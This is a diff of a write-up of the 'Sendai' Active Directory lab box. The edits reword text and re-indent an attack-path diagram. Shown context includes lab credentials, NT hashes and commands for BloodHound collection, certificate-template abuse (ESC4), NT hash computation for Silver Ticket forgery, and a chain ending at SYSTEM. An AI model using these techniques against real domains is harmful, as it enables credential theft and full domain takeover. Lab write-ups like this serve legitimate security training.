@@ -127,7 +127,7 @@ rusthound-ce -d sendai.vl -u Elliot.Yates -p Password1 -c All --zip
 
 ![sendai-bloodhound-2](/assets/img/sendai/sendai-bloodhound-2.png)
 
-The graph surfaces a clean chain:
+The graph shows a clean chain:
 
 ```text
 ELLIOT.YATES → MemberOf → support
@@ -173,7 +173,7 @@ ewp -i sendai.vl -u 'mgtsvc$' -H 1cee4a65ef4459e44eb0031cc640ba18
 
 > **Note:** `ewp` is [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py) — the Python port of evil-winrm.
 
-Run PrivescCheck to hunt for misconfigurations:
+Run PrivescCheck to check for misconfigurations:
 
 ```powershell
 . .\PrivescCheck.ps1; Invoke-PrivescCheck
@@ -218,7 +218,7 @@ Enrollee Supplies Subject   : False
 
 ![sendai-esc4](/assets/img/sendai/sendai-esc4.png)
 
-Back up the current config, then overwrite it with ESC1-compatible defaults:
+Back up the current config, then overwrite it to make it vulnerable to ESC1:
 
 ```bash
 certipy template -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -template SendaiComputer -save-configuration sendai_backup.json
@@ -311,7 +311,7 @@ ligolo-ng » route_add --name ligolo --route 240.0.0.1/32
 
 ### Silver Ticket Forgery
 
-A Silver Ticket is a forged TGS crafted entirely offline using the service account's NT hash — no DC interaction required. We forge a ticket impersonating `Administrator` against the `MSSQL/dc.sendai.vl` SPN using `sqlsvc`'s hash:
+Since we have sqlsvc's password we can compute the NT hash and forge a Silver Ticket — a TGS signed entirely offline with the service account's key, no DC involved. We impersonate Administrator against the MSSQL/dc.sendai.vl SPN:
 
 ```bash
 echo -n 'SurenessBlob85' | iconv -t UTF-16LE | openssl dgst -md4
@@ -360,39 +360,39 @@ SYSTEM via Silver Ticket → MSSQL → SeImpersonatePrivilege.
 ## Attack Flow
 
 ```text
-    	                                   sendai.vl
-    	                                       |
-    	                           [Guest SMB — sendai share]
-    	                        incident.txt → expired accounts
-    	                                       |
-    	                           [RID Cycling + null spray]
-    	                          Elliot.Yates / Thomas.Powell
-    	                          STATUS_PASSWORD_MUST_CHANGE
-    	                                       |
-    	                             [nxc change-password]
-    	                             Elliot.Yates:Password1
-    	                                       |
-    	                                  [BloodHound]
-    	                         support → GenericAll → ADMSVC
-    	                      ADMSVC → ReadGMSAPassword → mgtsvc$
-    	                                       |
-    	                              --- Path 1: ESC4 ---
-    	                               bloodyAD → ADMSVC
-    	                        ReadGMSAPassword → mgtsvc$ shell
-    	                         PrivescCheck → clifford.davey
-    	                              CA-OPERATORS → ESC4
-    	                           certipy template overwrite
-    	                             certipy req -upn -sid
-    	                           certipy auth → Admin hash
-    	                                       |
-    	                         --- Path 2: Silver Ticket ---
-    	                           config share → .sqlconfig
-    	                             sqlsvc:SurenessBlob85
-    	                             Ligolo-ng → MSSQL:1433
-    	                           ticketer.py → Admin ccache
-    	                               mssqlclient.py -k
-    	                            xp_cmdshell → hoaxshell
-    	                               GodPotato → SYSTEM
-    	                                       |
-    	                                     SYSTEM
+                                       sendai.vl
+                                           |
+                               [Guest SMB — sendai share]
+                            incident.txt → expired accounts
+                                           |
+                               [RID Cycling + null spray]
+                              Elliot.Yates / Thomas.Powell
+                              STATUS_PASSWORD_MUST_CHANGE
+                                           |
+                                 [nxc change-password]
+                                 Elliot.Yates:Password1
+                                           |
+                                      [BloodHound]
+                             support → GenericAll → ADMSVC
+                          ADMSVC → ReadGMSAPassword → mgtsvc$
+                                           |
+                                  --- Path 1: ESC4 ---
+                                   bloodyAD → ADMSVC
+                            ReadGMSAPassword → mgtsvc$ shell
+                             PrivescCheck → clifford.davey
+                                  CA-OPERATORS → ESC4
+                               certipy template overwrite
+                                 certipy req -upn -sid
+                               certipy auth → Admin hash
+                                           |
+                             --- Path 2: Silver Ticket ---
+                               config share → .sqlconfig
+                                 sqlsvc:SurenessBlob85
+                                 Ligolo-ng → MSSQL:1433
+                               ticketer.py → Admin ccache
+                                   mssqlclient.py -k
+                                xp_cmdshell → hoaxshell
+                                   GodPotato → SYSTEM
+                                           |
+                                         SYSTEM
 ```
